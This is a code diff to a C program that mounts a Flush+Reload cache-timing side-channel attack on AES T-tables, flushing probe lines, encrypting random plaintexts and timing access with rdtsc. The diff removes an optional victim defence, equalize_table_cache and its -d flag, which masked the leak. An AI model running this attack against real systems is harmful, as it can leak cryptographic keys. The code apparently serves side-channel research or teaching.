@@ -14,7 +14,6 @@
 // this number varies on different systems
 #define MIN_CACHE_MISS_CYCLES_DEFAULT (240)
 static unsigned int MIN_CACHE_MISS_CYCLES = MIN_CACHE_MISS_CYCLES_DEFAULT;
-static bool VICTIM_DEFENSE = false;
 
 // more encryptions show features more clearly
 #define NUMBER_OF_ENCRYPTIONS (40000)
@@ -93,25 +92,15 @@ uint32_t subWord(uint32_t word) {
   return retval;
 }
 
-void equalize_table_cache(char* const probe[]) {
-  for (int table = 0; table < 4; table++) {
-    for (size_t offset = 0; offset < 0x400; offset += 64)
-      maccess(probe[table] + offset);
-  }
-}
-
 int main(int argc, char **argv)
 {
   int opt;
-  while ((opt = getopt(argc, argv, "c:dh")) != -1) {
+  while ((opt = getopt(argc, argv, "c:h")) != -1) {
     switch (opt) {
       case 'c': MIN_CACHE_MISS_CYCLES = (unsigned int)atoi(optarg); break;
-      case 'd': VICTIM_DEFENSE = true; break;
       case 'h':
       default:
-        fprintf(stderr,
-                "Usage: %s [-c MIN_CACHE_MISS_CYCLES] [-d]\n",
-                argv[0]);
+        fprintf(stderr, "Usage: %s [-c MIN_CACHE_MISS_CYCLES]\n", argv[0]);
         return opt == 'h' ? 0 : 1;
     }
   }
@@ -179,7 +168,6 @@ int main(int argc, char **argv)
       plaintext[j] = rand() % 256;
     flush(probe[0]);
     AES_encrypt(plaintext, ciphertext, &key_struct);
-    if (VICTIM_DEFENSE) equalize_table_cache(probe);
     size_t time = rdtsc();
     maccess(probe[0]);
     size_t delta = rdtsc() - time;
@@ -202,7 +190,6 @@ int main(int argc, char **argv)
       plaintext[j] = rand() % 256;
     flush(probe[1]);
     AES_encrypt(plaintext, ciphertext, &key_struct);
-    if (VICTIM_DEFENSE) equalize_table_cache(probe);
     size_t time = rdtsc();
     maccess(probe[1]);
     size_t delta = rdtsc() - time;
@@ -225,7 +212,6 @@ int main(int argc, char **argv)
       plaintext[j] = rand() % 256;
     flush(probe[2]);
     AES_encrypt(plaintext, ciphertext, &key_struct);
-    if (VICTIM_DEFENSE) equalize_table_cache(probe);
     size_t time = rdtsc();
     maccess(probe[2]);
     size_t delta = rdtsc() - time;
@@ -248,7 +234,6 @@ int main(int argc, char **argv)
       plaintext[j] = rand() % 256;
     flush(probe[3]);
     AES_encrypt(plaintext, ciphertext, &key_struct);
-    if (VICTIM_DEFENSE) equalize_table_cache(probe);
     size_t time = rdtsc();
     maccess(probe[3]);
     size_t delta = rdtsc() - time;
